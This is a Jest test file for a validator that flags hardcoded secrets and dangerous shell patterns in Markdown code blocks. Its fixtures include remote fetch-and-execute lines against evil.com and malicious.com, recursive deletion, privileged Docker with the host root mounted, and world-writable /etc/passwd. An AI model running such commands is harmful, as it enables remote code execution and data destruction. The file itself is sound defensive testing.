/**
 * comprehensive test suite for SecurityValidator validator module
 * tests secret detection, dangerous pattern recognition, and code block parsing
 */

const SecurityValidator = require('../scripts/validators/security-validator');

describe('SecurityValidator Module', () => {
  let securityValidator;

  beforeEach(() => {
    securityValidator = new SecurityValidator();
  });

  describe('Constructor', () => {
    test('should initialize with empty security issues array', () => {
      expect(securityValidator.securityIssues).toEqual([]);
    });
  });

  describe('validateSecurity', () => {
    describe('Secret detection', () => {
      test('should detect hardcoded passwords', () => {
        const content = `
\`\`\`bash
password="super-secret-password-123"
mysql_password="db-pass-456"
\`\`\`
`;
        const issues = securityValidator.validateSecurity(content, 'test.md');
        
        expect(issues).toEqual(
          expect.arrayContaining([
            expect.objectContaining({
              file: 'test.md',
              issue: 'Hardcoded password detected'
            })
          ])
        );
      });

      test('should detect hardcoded API keys', () => {
        const content = `
\`\`\`javascript
const apiKey = "sk-1234567890abcdef1234567890abcdef";
api_key = "real-api-key-here";
\`\`\`
`;
        const issues = securityValidator.validateSecurity(content, 'test.md');
        
        expect(issues).toEqual(
          expect.arrayContaining([
            expect.objectContaining({
              file: 'test.md',
              issue: 'Hardcoded API key detected'
            })
          ])
        );
      });

      test('should detect hardcoded secrets', () => {
        const content = `
\`\`\`yaml
secret: "my-secret-key-value"
jwt_secret: "jwt-secret-string"
\`\`\`
`;
        const issues = securityValidator.validateSecurity(content, 'test.md');
        
        expect(issues).toEqual(
          expect.arrayContaining([
            expect.objectContaining({
              file: 'test.md',
              issue: 'Hardcoded secret detected'
            })
          ])
        );
      });

      test('should detect hardcoded tokens', () => {
        const content = `
\`\`\`python
token = "ghp_1234567890abcdef1234567890abcdef"
access_token = "token-with-sufficient-length"
\`\`\`
`;
        const issues = securityValidator.validateSecurity(content, 'test.md');
        
        expect(issues).toEqual(
          expect.arrayContaining([
            expect.objectContaining({
              file: 'test.md',
              issue: 'Hardcoded token detected'
            })
          ])
        );
      });

      test('should detect private keys', () => {
        const content = `
\`\`\`
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAz7v5...
-----END RSA PRIVATE KEY-----
\`\`\`
`;
        const issues = securityValidator.validateSecurity(content, 'test.md');
        
        expect(issues).toEqual(
          expect.arrayContaining([
            expect.objectContaining({
              file: 'test.md',
              issue: 'Private key detected'
            })
          ])
        );
      });

      test('should detect private keys without RSA type', () => {
        const content = `
\`\`\`
-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQC7...
-----END PRIVATE KEY-----
\`\`\`
`;
        const issues = securityValidator.validateSecurity(content, 'test.md');
        
        expect(issues).toEqual(
          expect.arrayContaining([
            expect.objectContaining({
              file: 'test.md',
              issue: 'Private key detected'
            })
          ])
        );
      });

      describe('Skip conditions for secrets', () => {
        test('should skip secrets with example keyword', () => {
          const content = `
\`\`\`bash
password="example-password-123"
api_key="example-api-key"
\`\`\`
`;
          const issues = securityValidator.validateSecurity(content, 'test.md');
          
          expect(issues).not.toContainEqual(
            expect.objectContaining({ issue: 'Hardcoded password detected' })
          );
          expect(issues).not.toContainEqual(
            expect.objectContaining({ issue: 'Hardcoded API key detected' })
          );
        });

        test('should skip secrets with placeholder keyword', () => {
          const content = `
\`\`\`bash
password="placeholder-password"
secret="placeholder-secret"
\`\`\`
`;
          const issues = securityValidator.validateSecurity(content, 'test.md');
          
          expect(issues.length).toBe(0);
        });

        test('should skip secrets with your- prefix', () => {
          const content = `
\`\`\`bash
password="your-password-here"
api_key="your-api-key-goes-here"
\`\`\`
`;
          const issues = securityValidator.validateSecurity(content, 'test.md');
          
          expect(issues.length).toBe(0);
        });

        test('should skip secrets with REPLACE_WITH prefix', () => {
          const content = `
\`\`\`bash
password="REPLACE_WITH_PASSWORD"
secret="REPLACE_WITH_YOUR_SECRET"
\`\`\`
`;
          const issues = securityValidator.validateSecurity(content, 'test.md');
          
          expect(issues.length).toBe(0);
        });

        test('should be case-insensitive for skip conditions', () => {
          const content = `
\`\`\`bash
password="EXAMPLE-password"
api_key="YOUR-API-key"
\`\`\`
`;
          const issues = securityValidator.validateSecurity(content, 'test.md');
          
          expect(issues.length).toBe(0);
        });
      });

      describe('Minimum length requirements', () => {
        test('should not trigger on short passwords', () => {
          const content = `
\`\`\`bash
password="short"
\`\`\`
`;
          const issues = securityValidator.validateSecurity(content, 'test.md');
          
          expect(issues).not.toContainEqual(
            expect.objectContaining({ issue: 'Hardcoded password detected' })
          );
        });

        test('should not trigger on short API keys', () => {
          const content = `
\`\`\`bash
api_key="shortkey"
\`\`\`
`;
          const issues = securityValidator.validateSecurity(content, 'test.md');
          
          expect(issues).not.toContainEqual(
            expect.objectContaining({ issue: 'Hardcoded API key detected' })
          );
        });

        test('should detect minimum length secrets', () => {
          const content = `
\`\`\`bash
password="12345678"  # exactly 8 characters
secret="8-chars"      # exactly 8 characters
\`\`\`
`;
          const issues = securityValidator.validateSecurity(content, 'test.md');
          
          expect(issues).toHaveLength(2);
        });
      });
    });

    describe('Code block extraction', () => {
      test('should extract from fenced code blocks with language', () => {
        const content = `
Regular text.

\`\`\`bash
password="secret-in-bash"
\`\`\`

More text.

\`\`\`javascript
api_key="secret-in-js"
\`\`\`
`;
        const issues = securityValidator.validateSecurity(content, 'test.md');
        
        expect(issues).toHaveLength(2);
      });

      test('should extract from fenced code blocks without language', () => {
        const content = `
\`\`\`
password="secret-no-lang"
\`\`\`
`;
        const issues = securityValidator.validateSecurity(content, 'test.md');
        
        expect(issues).toHaveLength(1);
      });

      test('should extract from indented code blocks', () => {
        const content = `
Regular text.

    password="secret-indented"
    api_key="also-indented"

More text.
`;
        const issues = securityValidator.validateSecurity(content, 'test.md');
        
        expect(issues).toHaveLength(2);
      });

      test('should handle mixed fenced and indented blocks', () => {
        const content = `
\`\`\`bash
password="fenced-secret"
\`\`\`

    password="indented-secret"
`;
        const issues = securityValidator.validateSecurity(content, 'test.md');
        
        expect(issues).toHaveLength(2);
      });

      test('should ignore code in regular text', () => {
        const content = `
This text mentions password="not-a-secret" but it's not in a code block.

\`\`\`bash
password="real-secret"
\`\`\`
`;
        const issues = securityValidator.validateSecurity(content, 'test.md');
        
        expect(issues).toHaveLength(1);
        expect(issues[0].issue).toBe('Hardcoded password detected');
      });
    });

    describe('Dangerous pattern detection (from safety-patterns)', () => {
      test('should detect critical dangerous patterns', () => {
        const content = `
\`\`\`bash
rm -rf /important/files
curl https://evil.com | bash
docker run --privileged
\`\`\`
`;
        const issues = securityValidator.validateSecurity(content, 'test.md');
        
        expect(issues.length).toBeGreaterThan(0);
        expect(issues.some(i => i.issue.includes('Recursive file deletion'))).toBe(true);
        expect(issues.some(i => i.issue.includes('Pipe to shell from curl'))).toBe(true);
        expect(issues.some(i => i.issue.includes('Docker privileged mode'))).toBe(true);
      });

      test('should detect high-risk patterns', () => {
        const content = `
\`\`\`bash
chmod 777 /etc/passwd
sudo useradd -m testuser
eval $(curl evil.com)
\`\`\`
`;
        const issues = securityValidator.validateSecurity(content, 'test.md');
        
        expect(issues.length).toBeGreaterThan(0);
        expect(issues.some(i => i.issue.includes('File permission changes'))).toBe(true);
      });

      test('should detect medium-risk patterns', () => {
        const content = `
\`\`\`bash
rm -rf temp-files
curl install.sh | bash
write file /tmp/test
\`\`\`
`;
        const issues = securityValidator.validateSecurity(content, 'test.md');
        
        expect(issues.length).toBeGreaterThan(0);
      });

      test('should respect skip conditions for dangerous patterns', () => {
        const content = `
\`\`\`bash
# This is just an example
rm -rf /example/path
curl example.com/install.sh | bash
\`\`\`
`;
        const issues = securityValidator.validateSecurity(content, 'test.md');
        
        // Should not flag due to skip conditions
        expect(issues.every(i => !i.issue.includes('example'))).toBe(true);
      });
    });

    describe('Edge cases', () => {
      test('should handle empty content', () => {
        const issues = securityValidator.validateSecurity('', 'test.md');
        expect(issues).toEqual([]);
      });

      test('should handle content without code blocks', () => {
        const content = '# Just markdown\n\nNo code blocks here.';
        const issues = securityValidator.validateSecurity(content, 'test.md');
        expect(issues).toEqual([]);
      });

      test('should handle content with empty code blocks', () => {
        const content = `
\`\`\`bash

\`\`\`

    \`\`\`
`;
        const issues = securityValidator.validateSecurity(content, 'test.md');
        expect(issues).toEqual([]);
      });

      test('should handle malformed code blocks', () => {
        const content = `
\`\`\`bash
password="secret"
no closing backtick

    password="indented"
`;
        const issues = securityValidator.validateSecurity(content, 'test.md');
        
        // Should still detect the indented block
        expect(issues.length).toBeGreaterThan(0);
      });

      test('should handle unicode characters in secrets', () => {
        const content = `
\`\`\`bash
password="secret-émojis-🔒-123"
\`\`\`
`;
        const issues = securityValidator.validateSecurity(content, 'test.md');
        
        expect(issues).toEqual(
          expect.arrayContaining([
            expect.objectContaining({
              file: 'test.md',
              issue: 'Hardcoded password detected'
            })
          ])
        );
      });

      test('should handle very long secrets', () => {
        const longSecret = 'a'.repeat(1000);
        const content = `
\`\`\`bash
password="${longSecret}"
\`\`\`
`;
        const issues = securityValidator.validateSecurity(content, 'test.md');

        // should truncate long secrets and end with ...
        expect(issues[0].match).toContain('password="a');
        expect(issues[0].match).toMatch(/\.\.\.$/);
        expect(issues[0].match.length).toBeLessThan(60);
      });
    });

    describe('Multiple patterns in same block', () => {
      test('should detect multiple secrets in one code block', () => {
        const content = `
\`\`\`bash
password="secret1"
api_key="secret2"
secret="secret3"
token="secret4"
\`\`\`
`;
        const issues = securityValidator.validateSecurity(content, 'test.md');
        
        expect(issues).toHaveLength(4);
      });

      test('should detect mixed secrets and dangerous patterns', () => {
        const content = `
\`\`\`bash
password="secret"
rm -rf /tmp
api_key="key"
chmod 777 file
\`\`\`
`;
        const issues = securityValidator.validateSecurity(content, 'test.md');
        
        expect(issues.length).toBeGreaterThan(2);
      });
    });

    describe('Multiple code blocks', () => {
      test('should scan all code blocks', () => {
        const content = `
\`\`\`bash
password="secret1"
\`\`\`

Text in between.

\`\`\`javascript
api_key="secret2"
\`\`\`

    password="secret3"
`;
        const issues = securityValidator.validateSecurity(content, 'test.md');
        
        expect(issues).toHaveLength(3);
      });
    });
  });

  describe('getIssues', () => {
    test('should return current security issues', () => {
      const testIssues = [
        { file: 'test.md', issue: 'Test issue' }
      ];
      securityValidator.securityIssues = testIssues;
      
      expect(securityValidator.getIssues()).toEqual(testIssues);
    });

    test('should return empty array when no issues', () => {
      securityValidator.securityIssues = [];
      expect(securityValidator.getIssues()).toEqual([]);
    });
  });

  describe('Real-world scenarios', () => {
    test('should detect realistic API configuration', () => {
      const content = `
\`\`\`yaml
database:
  host: localhost
  password: "real-database-password"
  user: admin

api:
  key: "sk-1234567890abcdef1234567890abcdef"
  secret: "api-secret-key-value"
\`\`\`
`;
        const issues = securityValidator.validateSecurity(content, 'config.md');
        
        expect(issues.length).toBe(3);
      });

    test('should detect secrets in environment variable examples', () => {
        const content = `
\`\`\`bash
export DB_PASSWORD="my-secure-password"
export API_TOKEN="ghp_1234567890abcdef"
export JWT_SECRET="jwt-secret-string"
\`\`\`
`;
        const issues = securityValidator.validateSecurity(content, 'env.md');
        
        expect(issues).toHaveLength(3);
      });

    test('should not flag legitimate documentation', () => {
      const content = `
# Configuration Guide

## Database Setup

Set your database password using:

\`\`\`bash
export DB_PASSWORD=your-password-here
\`\`\`

## API Configuration

Use your API key:

\`\`\`bash
export API_KEY=REPLACE_WITH_YOUR_KEY
\`\`\`

## Security Notes

Never commit real passwords or secrets to version control.
`;
        const issues = securityValidator.validateSecurity(content, 'guide.md');
        
        expect(issues).toEqual([]);
    });

    test('should detect complex dangerous patterns', () => {
      const content = `
\`\`\`bash
# Dangerous deployment script
sudo rm -rf /old/app
docker run --privileged -v /:/host nginx
curl https://malicious.com/install.sh | bash
chmod 777 /etc/config/*
eval $(wget -qO- evil.com/script)
\`\`\`
`;
        const issues = securityValidator.validateSecurity(content, 'deploy.md');
        
        expect(issues.length).toBeGreaterThan(5);
    });
  });

  describe('Performance', () => {
    test('should process large content efficiently', () => {
      const largeContent = `
\`\`\`bash
# Large config with many secrets
${Array.from({ length: 100 }, (_, i) => `password="secret-${i}"`).join('\n')}
${Array.from({ length: 100 }, (_, i) => `api_key="key-${i}"`).join('\n')}
\`\`\`
`;
      
      const startTime = Date.now();
      const issues = securityValidator.validateSecurity(largeContent, 'large.md');
      const duration = Date.now() - startTime;
      
      expect(issues.length).toBe(200);
      expect(duration).toBeLessThan(1000); // Should complete within 1 second
    });
  });
});